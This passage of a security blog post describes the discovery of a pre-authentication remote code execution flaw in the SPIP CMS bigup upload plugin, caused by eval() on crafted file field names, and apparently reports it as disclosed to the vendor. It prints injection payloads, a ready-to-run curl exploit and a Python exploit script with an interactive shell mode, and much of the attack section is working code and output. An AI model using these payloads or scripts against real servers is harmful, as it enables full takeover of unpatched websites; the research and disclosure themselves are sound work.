│&nbsp;&nbsp; [.. SNIPPED ..]
├── lang
│&nbsp;&nbsp; ├── bigup_ar.php
│&nbsp;&nbsp; ├── bigup_de.php
│&nbsp;&nbsp; ├── bigup_en.php
│&nbsp;&nbsp; ├── bigup_fr.php
│&nbsp;&nbsp; ├── bigup_pt_br.php
│&nbsp;&nbsp; ├── bigup.xml
│&nbsp;&nbsp; ├── paquet-bigup_ar.php
│&nbsp;&nbsp; ├── paquet-bigup_de.php
│&nbsp;&nbsp; ├── paquet-bigup_en.php
│&nbsp;&nbsp; ├── paquet-bigup_fr.php
│&nbsp;&nbsp; ├── paquet-bigup_pt_br.php
│&nbsp;&nbsp; └── paquet-bigup.xml
├── lib
│&nbsp;&nbsp; [.. SNIPPED ..]
├── paquet.xml
├── phpcs.xml.dist
├── phpstan-baseline.neon
├── phpstan.neon.dist
├── prive
│&nbsp;&nbsp; [.. SNIPPED ..]
├── README.md
├── saisies
│&nbsp;&nbsp; [.. SNIPPED ..]
└── saisies-vues
    [.. SNIPPED ..]
</code></pre>

<p>Instead of spending time reading all the code, I started by researching dangerous behavior via <a href="https://fr.wikipedia.org/wiki/Expression_r%C3%A9guli%C3%A8re">RegEx</a>.</p>

<p>After several searches for dangerous functions: <code>eval</code>, <code>file_get_contents</code>, <code>system</code>… as well as <code>arbitrary object instantiation</code> such as <code>$a($b) )</code> I finally found a suspicious function! ☺️</p>

<h2 id="the-vulnerable-function">The vulnerable function</h2>

<p>In the <code>plugins-dist/bigup/inc/Bigup/Files.php</code> file, on line <em>230</em> the <em>extraire_fichiers_valides</em> function contains the following code:</p>

<pre><code class="language-php hljs"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">extraire_fichiers_valides</span><span class="hljs-params">()</span> </span>{
    $liste = [];
    <span class="hljs-keyword">if</span> (!count($_FILES)) {
        <span class="hljs-keyword">return</span> $liste;
    }

    $infos = []; <span class="hljs-comment">// name, pathname, error …</span>
    <span class="hljs-keyword">foreach</span> ($_FILES <span class="hljs-keyword">as</span> $racine =&gt; $descriptions) {
        $infos = array_keys($descriptions);
        <span class="hljs-keyword">break</span>;
    }

    <span class="hljs-keyword">foreach</span> ($_FILES <span class="hljs-keyword">as</span> $racine =&gt; $descriptions) {
        $error = $descriptions[<span class="hljs-string">'error'</span>];

        <span class="hljs-comment">// cas le plus simple : name="champ", on s'embête pas</span>
        <span class="hljs-keyword">if</span> (!is_array($error)) {
            <span class="hljs-keyword">if</span> ($error == <span class="hljs-number">0</span>) {
                $liste[$racine] = [$descriptions];
                <span class="hljs-keyword">unset</span>($_FILES[$racine]);
            }
            <span class="hljs-keyword">continue</span>;
        }

        <span class="hljs-comment">// cas plus compliqués :</span>
        <span class="hljs-comment">// name="champ[tons][][sous][la][pluie][]"</span>
        <span class="hljs-comment">// $_FILES[champ][error][tons][0][sous][la][pluie][0]</span>
        <span class="hljs-keyword">else</span> {
            $chemins = Files::extraire_sous_chemins_fichiers($error);

            <span class="hljs-keyword">foreach</span> ($chemins[<span class="hljs-string">'phps'</span>] <span class="hljs-keyword">as</span> $k =&gt; $chemin) {
                $var = <span class="hljs-string">'$_FILES[\''</span> . $racine . <span class="hljs-string">'\'][\'error\']'</span> . $chemin;
                <span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$error = $var;"</span>);

                <span class="hljs-keyword">if</span> ($error == <span class="hljs-number">0</span>) {
                    $description = [];
                    <span class="hljs-keyword">foreach</span> ($infos <span class="hljs-keyword">as</span> $info) {
                        $var = <span class="hljs-string">'$_FILES[\''</span> . $racine . <span class="hljs-string">'\'][\''</span> . $info . <span class="hljs-string">'\']'</span> . $chemin;
                        <span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$x = $var; unset($var);"</span>);
                        $description[$info] = $x;
                    }

                    $complet = $racine . $chemins[<span class="hljs-string">'names'</span>][$k];
                    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($liste[$complet])) {
                        $liste[$complet] = [];
                    }
                    $liste[$complet][] = $description;
                }
            }
        }
    }

    <span class="hljs-keyword">return</span> $liste;
}
</code></pre>

<blockquote>
<p>Do you smel it? That smelly RCE smel? 👀</p>
</blockquote>

<p>Indeed, a lot of eval is carried out!</p>

<p>Here’s the comments above the function read:</p>

<pre><code class="language-php hljs"><span class="hljs-comment">/**
 * Extrait et enlève de `$_FILES` les fichiers reçus sans erreur
 * et crée un tableau avec pour clé le champ d'origine du fichier
 *
 * <span class="hljs-doctag">@return</span> array Tableau (champ =&gt; [description])
 */</span>
</code></pre>

<p>The function seems to handle uploaded files, I didn’t have the courage to setup XDebug so a simple <code>echo</code> in the Docker logs will suffice for debugging.</p>

<p>It’s apparently used to pass from a path name to an array path. Why eval then?</p>

<p>So I added the following code at the start of the function, and displayed <code>$_FILES</code> to see what will pass through during uploads:</p>

<pre><code class="language-php hljs"><span class="hljs-comment">## Debug like a boss</span>
error_log(<span class="hljs-string">"######################################"</span>);
error_log(<span class="hljs-string">"Call to extraire_fichiers_valides"</span>);
error_log(json_encode($_FILES));
error_log(<span class="hljs-string">"######################################"</span>);
</code></pre>

<p>Plus we read this comment:</p>

<pre><code class="hljs">// cas plus compliqués :
// name="champ[tons][][sous][la][pluie][]"
// $_FILES[champ][error][tons][0][sous][la][pluie][0]
</code></pre>

<p>To trigger the various EVALs, we need to send a file with the parameter <code>name</code> of the form <em>champ[tons][][sous][la][pluie][]</em>.
So you can navigate from the logged-in area to <code>/ecrire</code> and upload an image. Here I’m using the form to send a profile photo</p>

<p>I also added:</p>

<pre><code class="language-php hljs">error_log($racine);
error_log($chemin);
$var = <span class="hljs-string">'$_FILES[\''</span> . $racine . <span class="hljs-string">'\'][\'error\']'</span> . $chemin;
error_log($var);
</code></pre>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/error_log.png" alt="error_log"></p>

<p>Uploading an image sends 3 requests, 2 of which trigger the <code>extract_valid_files</code> function!</p>

<p>These two requests don’t contain the uploaded image, but they do reach our vulnerable code! 😁</p>

<pre><code class="language-bash hljs">POST /ecrire/?<span class="hljs-built_in">exec</span>=auteur&amp;id_auteur=1 HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------35974249246826023222844215477
Content-Length: 1584
Origin: http://localhost:8000
Connection: keep-alive
Referer: http://localhost:8000/ecrire/?<span class="hljs-built_in">exec</span>=auteur&amp;id_auteur=1
Cookie: spip_session=1_d11b8a893cc1f545e2dee6e3e5ceb3ec; spip_admin=%40root%40root.root; spip_accepte_ajax=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-PwnFox-Color: blue

-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"var_ajax"</span>

form
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"exec"</span>

auteur
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"id_auteur"</span>

1
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"formulaire_action"</span>

editer_logo
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"formulaire_action_args"</span>

o7aLD55YnoVFatZHAGqAQwWZcL0Z6FaCfDb4yh9BlxHzEDHJjuuhj1zH/aQrCvgA3lRry1gAXIHgxJclaNiXP7J3xnoB+JE/twMTVpcmUQOczifhWzHFchZPDMxK0Sia4few939TklVQhnGYmdnbni4cOszvyb3ueOHYnGsiBda5GtVbmHwU3g4eAS/CgDM4SbQj5xvy0CLNKxbCbNL75db6W+NetjxgKlHBdLlpP8eiRnzNSd11MGmPqGezNBV+1CH5T/OUZkOfy2uKfo/WdwFGduql2JNpSUWmXLQY9RjR1ZwQredgR9E=
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"formulaire_action_sign"</span>

61e4242ff0083987cd3f876d5daa0a9ece8d7c772f4bb1f248ce3f4cb4bc9b47
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"bigup_retrouver_fichiers"</span>

1
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"formulaire_action_verifier_json"</span>

<span class="hljs-literal">true</span>
-----------------------------35974249246826023222844215477
Content-Disposition: form-data; name=<span class="hljs-string">"bigup_reinjecter_uniquement"</span>

@28ef70ab@
-----------------------------35974249246826023222844215477--
</code></pre>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/log1.png" alt="./log1"></p>

<p>You can immediately see that <code>$_FILES</code> is empty:</p>

<pre><code class="language-php hljs">[Mon Sep  <span class="hljs-number">2</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">49</span> <span class="hljs-number">2024</span>] <span class="hljs-comment">######################################</span>
[Mon Sep  <span class="hljs-number">2</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">49</span> <span class="hljs-number">2024</span>] Call to extraire_fichiers_valides
[Mon Sep  <span class="hljs-number">2</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">49</span> <span class="hljs-number">2024</span>] []
[Mon Sep  <span class="hljs-number">2</span> <span class="hljs-number">20</span>:<span class="hljs-number">46</span>:<span class="hljs-number">49</span> <span class="hljs-number">2024</span>] <span class="hljs-comment">######################################</span>
</code></pre>

<p>So we can ask our best friend to add a file to our POST request:</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/gpt.png" alt="./gpt"></p>

<p>And… IT’S A <em>small</em> WIN! We control the file passed to the function:</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/code_triggered.png" alt="code_triggered"></p>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/meme_gpt.png" alt="meme_gpt"></p>

<p>We can therefore adapt the <code>name</code> parameter with <code>[]</code>:</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/first.png" alt="first"></p>

<p>Here is an extract from logs:</p>

<pre><code class="language-bash hljs">[Mon Sep  2 21:41:54 2024] <span class="hljs-comment">######################################</span>
[Mon Sep  2 21:41:54 2024] Call to extraire_fichiers_valides
[Mon Sep  2 21:41:54 2024] {<span class="hljs-string">"HELLO"</span>:{<span class="hljs-string">"name"</span>:{<span class="hljs-string">"WORLD"</span>:<span class="hljs-string">"example.txt"</span>},<span class="hljs-string">"full_path"</span>:{<span class="hljs-string">"WORLD"</span>:<span class="hljs-string">"example.txt"</span>},<span class="hljs-string">"type"</span>:{<span class="hljs-string">"WORLD"</span>:<span class="hljs-string">"text\/plain"</span>},<span class="hljs-string">"tmp_name"</span>:{<span class="hljs-string">"WORLD"</span>:<span class="hljs-string">"\/tmp\/phpB6Hmiq"</span>},<span class="hljs-string">"error"</span>:{<span class="hljs-string">"WORLD"</span>:0},<span class="hljs-string">"size"</span>:{<span class="hljs-string">"WORLD"</span>:38}}}
[Mon Sep  2 21:41:54 2024] <span class="hljs-comment">######################################</span>
[Mon Sep  2 21:41:54 2024] HELLO
[Mon Sep  2 21:41:54 2024] [<span class="hljs-string">'WORLD'</span>]
[Mon Sep  2 21:41:54 2024] <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">'HELLO'</span>][<span class="hljs-string">'error'</span>][<span class="hljs-string">'WORLD'</span>]
</code></pre>

<p>The last 3 lines correspond to <code>$racine</code> <code>$chemin</code> and <code>$var</code>.</p>

<p><code>$var</code> corresponds to the string that will be evaluated next, passing <em>“HELLO[WORLD]”</em>, here’s the string formed:</p>

<pre><code class="language-php hljs">$_FILES[<span class="hljs-string">'HELLO'</span>][<span class="hljs-string">'error'</span>][<span class="hljs-string">'WORLD'</span>]
</code></pre>

<p>The complete code evaluated will therefore be:</p>

<pre><code class="language-php hljs">$error = $_FILES[<span class="hljs-string">'HELLO'</span>][<span class="hljs-string">'error'</span>][<span class="hljs-string">'WORLD'</span>];
</code></pre>

<h2 id="remote-code-execution">Remote Code Execution</h2>

<blockquote>
<p>What happens if I send a single quote? 🤔</p>
</blockquote>

<p>Response: <strong>The server returns a 500 error!</strong></p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/500.png" alt="500"></p>

<p>From the docker logs, we can read:</p>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/500_log.png" alt="500_log"></p>

<p>Here we see that the <code>'</code> is not filtered, so the context is broken and the call to <em>eval</em> returns an error.</p>

<p>Finally, we can add a real payload to control the contents of the string between the square brackets.</p>

<p>The payload payload <code>HELLO[AB'.strval(5+5).'CD]</code> lead to this log line:</p>

<pre><code class="language-bash hljs">Undefined array key <span class="hljs-string">"AB10CD"</span> <span class="hljs-keyword">in</span> ... plugins-dist/bigup/inc/Bigup/Files.php(276) : <span class="hljs-built_in">eval</span>()<span class="hljs-string">'d code on line 1
</span></code></pre>

<p>The rce is now trivial, with the following payload:</p>

<pre><code class="language-php hljs">name=<span class="hljs-string">"HELLO[AB'.system('id').die().'CD]"</span>
</code></pre>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/rce.png" alt="rce"></p>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/win2.png" alt="win2"></p>

<p>My first reaction was like</p>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/lalu.png" alt="lalu"></p>

<p>But in the end he confirmed that he didn’t have it in his notes!</p>

<p>If you’re curious, this was related to my <a href="https://x.com/Vozec1/status/1822647021733281895">teasing tweet</a> from a few weeks ago, hashing the proof that I had this exploit at this time, without leaking sensitive information (kindly suggested to do so by Laluka to keep track &amp; proofs).</p>

<pre><code class="language-php hljs">[~/Desktop]$ <span class="hljs-keyword">echo</span> -ne <span class="hljs-string">"name=\"RCE['.system('id').die().']\";"</span> | md5sum
<span class="hljs-number">9</span>fd0828be2a9d90e89e226f1fcd6d5d9  -
</code></pre>

<h2 id="additional-note">Additional note:</h2>

<p>The vulnerability can also be triggered in the first part of the name parameter:</p>

<pre><code class="language-php hljs">name=<span class="hljs-string">"RCE'-system('id')-'[ABCD]"</span>
</code></pre>

<p>The dot is filtered, but you can use <code>sprintf</code> to call the <code>die</code> function after the <code>system</code> to avoid an error in logs:</p>

<pre><code class="language-php hljs">name=<span class="hljs-string">"RCE'-sprintf(system('id'),die())-'[ABCD]"</span>
</code></pre>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/isok.png" alt="isok"></p>

<hr>

<p>Hello, Laluka here! 👋</p>

<p>I’ll take the next part that makes this lovely post-auth RCE pre-auth! 😉</p>

<h2 id="making-the-rce-pre-auth">Making the RCE Pre-Auth</h2>

<p>Once Vozec showed me that his issue was related to file upload, and required a form to submit, I had two thoughts:</p>

<ul>
<li>First, we might get lucky, maybe the code path is reached with any form?</li>
<li>Second, if we’re unlucky, we’ll have to find another path!</li>
</ul>

<p>So, here’s the flow:
- <code>extraire_fichiers_valides()</code> from <code>plugins-dist/bigup/inc/Bigup/Files.php</code>, called by
  - <code>gerer_fichiers_postes()</code> within <code>plugins-dist/bigup/inc/Bigup.php</code>, called by
    - <code>bigup_formulaire_receptionner($flux)</code> within <code>plugins-dist/bigup/bigup_pipelines.php</code></p>

<p>I stopped there, as the pipelining system behaves in a “global” way, -close to- every pass through it, so let’s “assume” we’re lucky, and hit right away!</p>

<p>The code only passes through the right code path if a specific parameter is present, so let’s add it! (i.e. <code>bigup_retrouver_fichiers=foo</code>)</p>

<pre><code class="language-bash hljs">/**
 * Branchement sur la réception d<span class="hljs-string">'un formulaire (avant verifier())
 *
 * On remet `$_FILES` avec les fichiers présents pour ce formulaire,
 * et avant que la fonction verifier native du formulaire soit utilisée,
 * de sorte qu'</span>elle ait accès à <span class="hljs-variable">$_FILES</span> rempli.
 *
 * @pipeline formulaire_receptionner
 * @param array <span class="hljs-variable">$flux</span>
 * @<span class="hljs-built_in">return</span> array
 */
<span class="hljs-keyword">function</span> bigup_formulaire_receptionner(<span class="hljs-variable">$flux</span>) {
	<span class="hljs-keyword">if</span> (_request(<span class="hljs-string">'bigup_retrouver_fichiers'</span>)) {
		<span class="hljs-variable">$bigup</span> = bigup_get_bigup(<span class="hljs-variable">$flux</span>);
		<span class="hljs-variable">$bigup</span>-&gt;gerer_fichiers_postes(); // les fichiers postés sans JS
		<span class="hljs-variable">$liste</span> = <span class="hljs-variable">$bigup</span>-&gt;reinserer_fichiers(_request(<span class="hljs-string">'bigup_reinjecter_uniquement'</span>));
		<span class="hljs-variable">$bigup</span>-&gt;surveiller_fichiers(<span class="hljs-variable">$liste</span>);
	}
	<span class="hljs-built_in">return</span> <span class="hljs-variable">$flux</span>;
}
</code></pre>

<blockquote>
<p>Note the <code>Branchement sur la réception d'un formulaire (avant verifier())</code> in the comment, clearly stating that all this logic (including eval) will take place before the verification/validation steps take place.. 😅</p>
</blockquote>

<p>From there, I took one page that is almost always present, the “forgotten password” one!</p>

<ul>
<li><a href="http://0.0.0.0:8000/spip.php?page=spip_pass&amp;lang=fr">http://0.0.0.0:8000/spip.php?page=spip_pass&amp;lang=fr</a></li>
</ul>

<p>What I wanted to have in the request, is the <code>formulaire_action_args</code> protected and encoded variable at hand:</p>

<ul>
<li>I want to submit a <code>form</code>, therefore requiring <code>formulaire_action_args</code></li>
<li>With extra “files” (our RCE payload)</li>
<li>With our extra <code>bigup_retrouver_fichiers</code> param to enable the bigup part!</li>
</ul>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/formulaire_action_args.png" alt="formulaire_action_args"></p>

<p>Any extra steps? Nope! It worked right away! 🍀</p>

<h2 id="unauth-spip-rce-final-exploit">Unauth Spip RCE Final Exploit</h2>

<p>As a script, this gives us the following concise exploit:</p>

<pre><code class="language-bash hljs"><span class="hljs-built_in">echo</span> foo &gt; foo.txt
cmd=<span class="hljs-string">"id; date"</span>
formulaire_action_args=$(curl -k <span class="hljs-string">'http://127.0.0.1:8000/spip.php?page=spip_pass&amp;lang=fr'</span> | grep -F formulaire_action_args -C 3 | grep -ioP <span class="hljs-string">'[0-9a-zA-Z_/=+]{30,}'</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"formulaire_action_args: <span class="hljs-variable">$formulaire_action_args</span>"</span>
formulaire_action_args_encoded=$(python3 -c <span class="hljs-string">"import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))"</span> <span class="hljs-string">"<span class="hljs-variable">$formulaire_action_args</span>"</span>)
<span class="hljs-built_in">echo</span> <span class="hljs-string">"formulaire_action_args_encoded: <span class="hljs-variable">$formulaire_action_args_encoded</span>"</span>
base_url=<span class="hljs-string">"http://0.0.0.0:8000/spip.php?page=spip_pass&amp;lang=fr&amp;page=spip_pass&amp;lang=fr"</span>
final_payload=<span class="hljs-string">"formulaire_action=oubli&amp;formulaire_action_args=<span class="hljs-variable">$formulaire_action_args_encoded</span>&amp;formulaire_action_sign=&amp;oubli=foo%40foo.foo&amp;nobot=&amp;bigup_retrouver_fichiers=1"</span>
curl -ki -X POST -F <span class="hljs-string">"RCE['.system('<span class="hljs-variable">$cmd</span>').die().'][][ll]=@foo.txt"</span> <span class="hljs-string">"<span class="hljs-variable">$base_url</span>&amp;<span class="hljs-variable">$final_payload</span>"</span>
</code></pre>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/unauth-spip-rce.png" alt="unauth-spip-rce"></p>

<p>Vozec also made a python script for the same bug:</p>

<pre><code class="language-python hljs"><span class="hljs-comment">#!/bin/env python3</span>
<span class="hljs-keyword">import</span> argparse
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> io
<span class="hljs-keyword">import</span> readline
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote
<span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup
<span class="hljs-keyword">from</span> requests_toolbelt.multipart.encoder <span class="hljs-keyword">import</span> MultipartEncoder
<span class="hljs-keyword">import</span> urllib3

urllib3.disable_warnings()


<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">exploit</span>:</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, args)</span> -&gt; <span class="hljs-keyword">None</span>:</span>
        self.url = args.target
        self.s = requests.session()

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_tokens</span><span class="hljs-params">(self)</span>:</span>
        headers = {
            <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0"</span>,
            <span class="hljs-string">"Accept"</span>: <span class="hljs-string">"*/*"</span>,
            <span class="hljs-string">"Accept-Language"</span>: <span class="hljs-string">"fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3"</span>,
            <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded; charset=UTF-8"</span>,
        }
        url = <span class="hljs-string">f"<span class="hljs-subst">{self.url}</span>/spip.ph%70?pag%65=spip_pass&amp;lang=fr"</span>
        r = requests.Request(
            url=url,
            method=<span class="hljs-string">"GET"</span>,
            headers=headers,
        )
        prep = r.prepare()
        prep.url = url
        r = self.s.send(prep, verify=<span class="hljs-keyword">False</span>).text
        soup = BeautifulSoup(r, <span class="hljs-string">"html.parser"</span>)
        token = soup.find(<span class="hljs-string">"input"</span>, {<span class="hljs-string">"name"</span>: <span class="hljs-string">"formulaire_action_args"</span>})[<span class="hljs-string">"value"</span>]
        <span class="hljs-keyword">return</span> token

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span><span class="hljs-params">(self, cmd)</span>:</span>
        token = self.get_tokens()
        mp_encoder = MultipartEncoder(
            fields={
                <span class="hljs-string">"page"</span>: <span class="hljs-string">"spip_pass"</span>,
                <span class="hljs-string">"lang"</span>: <span class="hljs-string">"fr"</span>,
                <span class="hljs-string">"formulaire_action"</span>: <span class="hljs-string">"oubli"</span>,
                <span class="hljs-string">"formulaire_action_args"</span>: token,
                <span class="hljs-string">"formulaire_action_sign"</span>: <span class="hljs-string">""</span>,
                <span class="hljs-string">"oubli"</span>: <span class="hljs-string">"abc@gmail.com"</span>,
                <span class="hljs-string">"nobot"</span>: <span class="hljs-string">""</span>,
                <span class="hljs-string">"bigup_retrouver_fichiers"</span>: <span class="hljs-string">"a"</span>,
                <span class="hljs-string">f"RCE['.system('<span class="hljs-subst">{cmd}</span>').die().']"</span>: (
                    <span class="hljs-string">"abc.txt"</span>,
                    io.BytesIO(<span class="hljs-string">b"Hello"</span>),
                    <span class="hljs-string">"text/plain"</span>,
                ),
            }
        )
        url = <span class="hljs-string">f"<span class="hljs-subst">{self.url}</span>/spip.ph%70?pag%65=spip_pass&amp;lang=fr"</span>
        r = requests.Request(
            url=url,
            method=<span class="hljs-string">"POST"</span>,
            data=mp_encoder,
            headers={<span class="hljs-string">"Content-Type"</span>: mp_encoder.content_type},
        )
        prep = r.prepare()
        prep.url = url
        r = self.s.send(prep, verify=<span class="hljs-keyword">False</span>)
        <span class="hljs-keyword">return</span> r.text.strip()


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_args</span><span class="hljs-params">()</span>:</span>
    parser = argparse.ArgumentParser(description=<span class="hljs-string">"RCE Spip &lt;= 4.3.1"</span>)
    parser.add_argument(
        <span class="hljs-string">"-t"</span>, <span class="hljs-string">"--target"</span>, type=str, required=<span class="hljs-keyword">True</span>, help=<span class="hljs-string">"Target Url (ex: http://)"</span>
    )
    parser.add_argument(
        <span class="hljs-string">"-c"</span>, <span class="hljs-string">"--cmd"</span>, type=str, required=<span class="hljs-keyword">False</span>, help=<span class="hljs-string">"Shell command to execute"</span>
    )
    parser.add_argument(
        <span class="hljs-string">"-s"</span>, <span class="hljs-string">"--shell"</span>, action=<span class="hljs-string">"store_true"</span>, help=<span class="hljs-string">"Semi interactive shell"</span>
    )
    args = parser.parse_args()
    <span class="hljs-keyword">return</span> args


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span>
    args = get_args()
    x = exploit(args)
    <span class="hljs-keyword">if</span> args.cmd:
        res = x.exploit(args.cmd)
        print(res)

    <span class="hljs-keyword">if</span> args.shell:
        <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
            r = x.exploit(input(<span class="hljs-string">"$ "</span>))
            print(r)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    main()

<span class="hljs-string">"""
[~/Desktop/autre]$ python3 0day_rce_spip.py -t http://localhost:8000 -c id    
uid=1000(vozec) gid=1000(vozec) groupes=1000(vozec),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),995(input)

[~/Desktop]$ echo -ne "name=\"RCE['.system('id').die().']\";" | md5sum
9fd0828be2a9d90e89e226f1fcd6d5d9  -
"""</span>
</code></pre>

<h2 id="closing-words">Closing Words</h2>

<p>Spip reacted in a timely manner, no timeline this time! Oh yeah, one last thing… 🙃</p>

<blockquote>
<p>Nailed it! 😎</p>
</blockquote>

<p><img class="img_full" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/rce-rootme-acknowledgement.png" alt="rce-rootme-acknowledgement"></p>

<hr>

<p>As always, we hope you’ve had a nice time reading our adventures! 🧙<br>
Feel free to follow both of us for future challenges &amp; cool reads! 💝</p>

<p><img class="img_med" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/lalu-and-vozec.png" alt="lalu-and-vozec"></p>

  </div>
  

<div class="post--navigation post--navigation-single">
    
    <a href="https://thinkloveshare.com/hacking/spip_preauth_rce_2024_part_1_the_feather/" class="post--navigation-prev">
      <svg aria-hidden="true" class="svg-inline--fa fa-chevron-left fa-w-10" data-prefix="fa" data-icon="chevron-left" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512" data-fa-i2svg=""><path fill="currentColor" d="M34.52 239.03L228.87 44.69c9.37-9.37 24.57-9.37 33.94 0l22.67 22.67c9.36 9.36 9.37 24.52.04 33.9L131.49 256l154.02 154.75c9.34 9.38 9.32 24.54-.04 33.9l-22.67 22.67c-9.37 9.37-24.57 9.37-33.94 0L34.52 272.97c-9.37-9.37-9.37-24.57 0-33.94z"></path></svg><!-- <i aria-hidden="true" class="fa fa-chevron-left"></i> -->
      <span class="navigation-tittle">Spip Preauth RCE 2024: Part 1, The Feather</span>
    </a>
    
    
</div>


  

  
    


</article>


        </div>
        
    
  
  
<script type="application/javascript">
var doNotTrack = false;
if (!doNotTrack) {
	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
	ga('create', 'UA-128985075-1', 'auto');
	
	ga('send', 'pageview');
}
</script>
<script async="" src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/analytics.js.tải xuống"></script>



    
        
        
        <script src="./Spip Preauth RCE 2024_ Part 2, A Big Upload • Think Love Share_files/highlight.min.js.tải xuống"></script>
        
        <script type="text/javascript">
            hljs.configure({languages: []});
            hljs.initHighlightingOnLoad();
        </script>
        
        



    



    

</body></html>